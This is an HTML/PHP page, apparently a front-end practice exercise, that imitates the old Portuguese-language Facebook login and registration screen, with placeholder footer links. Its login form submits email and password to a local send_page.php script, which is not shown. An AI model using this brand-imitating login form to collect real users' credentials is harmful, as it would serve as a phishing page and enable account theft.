<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximun-scale=1.0">

    <meta name="description" content="exemplo de tela de login do facebook">
    <meta name="keywords" content="login,facebook,antiga">    
    <meta name="author" content="Emesson Cavalcante">

    <link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@1,300&family=Open+Sans:wght@500&family=Quicksand:wght@500&family=Roboto+Mono:wght@500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/style1.css">
        
    <title>Login Facebook</title>
</head>
<body>
    <header>
        <div class="center">
            <div class="logo">
                <h2>facebook</h2>
            </div><!--logo-->

            <form method="post" action="send_page.php" class="form-login">
                <div class="form-element">
                    <p>Email ou telefone</p>
                    <input type="email" name="email" id="email" required>
                    <p class="ajustar-linha">ajustar linha</p>
                </div><!--form-element-->

                <div class="form-element">
                    <p>Senha</p>
                    <input type="password" name="senha" id="senha" required>
                    <a href="#" class="esqueceu-senha"><p>Esqueceu a senha?</p></a>
                </div><!--form-element-->

                <div class="form-element">
                    <input type="submit" name="acao" id="entrar" value="Entrar">
                    <p class="ajustar-linha-2">ajustar</p>
                </div><!--form-element-->
            </form><!--form-login-->
            <div class="clear"></div>
        </div><!--center--> 
    </header>

    <main>
        <div class="center">
            <div class="metade-1">
                <p class="texto">
                    O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.
                </p>

                <div class="img-pessoas">
                    <img src="images/img2.png.png" alt="moon">
                </div>
            </div>

            <div class="metade-2">
                <div class="abrir-conta">
                    <h2>Abra uma conta</h2>
                    <h3>É gratuíto e sempre será!</h3>

                    <form action="" class="criar-conta">
                        <div class="w50">
                            <input placeholder="Nome" type="text">
                        </div>

                        <div class="w50">
                            <input placeholder="Sobrenome" type="text">
                        </div>

                        <div class="w100">
                            <input placeholder="Celular ou email" type="email">
                        </div>

                        <div class="w100">
                            <input placeholder="Nova senha" type="password">
                        </div>

                        <!--
                        <div class="data-nascimento">
                            <p>Data de nascimento</p>
                            <input type="date">
                            <div>
                                <span>Por que preciso informar minha data de nascimento?</span>
                            </div>
                        </div>
                        -->

                        <div class="w100">
                            <h3>Data de Nascimento</h3>
                            <select name="nascimento-dia" class="nascimento">

                                <?php
                                    for($i = 1; $i <= 31; $i++){
                                ?>
                                <option value="<?php echo $i; ?>"><?php echo $i; ?></option>
                                <?php } ?>

                            </select><!--DIA-->

                            <select name="nascimento-mes" class="nascimento">
                                <option value="1">Janeiro</option>
                                <option value="2">Fevereiro</option>
                                <option value="3">Março</option>
                                <option value="4">Abril</option>
                                <option value="5">Maio</option>
                                <option value="6">Junho</option>
                                <option value="7">Julho</option>
                                <option value="8">Agosto</option>
                                <option value="9">Setembro</option>
                                <option value="10">Outubro</option>
                                <option value="11">Novembro</option>
                                <option value="12">Dezembro</option>
                            </select><!--MÊS-->

                            <select name="nascimento-ano" class="nascimento">

                                <?php
                                    for($i = 1900; $i <= 2022; $i++){
                                ?>
                                <option value="<?php echo $i; ?>"><?php echo $i; ?></option>
                                <?php } ?>
                                
                            </select><!--ANO-->

                            <div class="data-nascimento">
                                <span>Por que preciso informar minha data de nascimento?</span>
                            </div>

                            <div class="clear"></div>
                        </div>

                        <div class="clear"></div>

                        <div class="sexo">
                            <input type="radio" name="sexo" id="masculino">
                                <label for="masculino">Masculino</label>
                            <input type="radio" name="sexo" id="feminino">
                            <label for="feminino">Feminino</label>
                        </div>

                        <div class="confirmacao">
                            <p>Ao clicar em Cadastre-se, você concorda com nossos Termos,Políticas de Dados e Política de Cookies. Você pode receber notificações por SMS e pode cancelar isso quando quiser.</p>
                        </div>

                        <div class="botao-cadastrar">
                            <input type="submit" value="Cadastre-se">
                        </div>

                        <div class="divulgacao">
                            <p><a href="#">Crie uma Página </a>para uma celebridade, banda ou empresa.</p>
                        </div>
                    </form><!--criar-conta-->
                </div>
            </div>
            <div class="clear"> </div>
        </div><!--center-->
    </main>

    <footer>
        <div class="center">
            <div class="linguagens">
                <p>Português (Brasil)</p>
                <p>English (USA)</p>
                <p>Español</p>
                <p>Français (France)</p>
                <p>Italiano</p>
                <p>Deutsch</p>
                <p>Outras línguas</p>
                <p class="imagem">
                    <img src="images/mais.png" alt="Mais idiomas">
                </p>
            </div>

            <div class="outros-links">
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
                <p>lorem impsum</p>
            </div>

            <div class="final">
                <p>Facebook @ 2022</p>
            </div>
        </div><!--center-->
    </footer>
</body>
</html>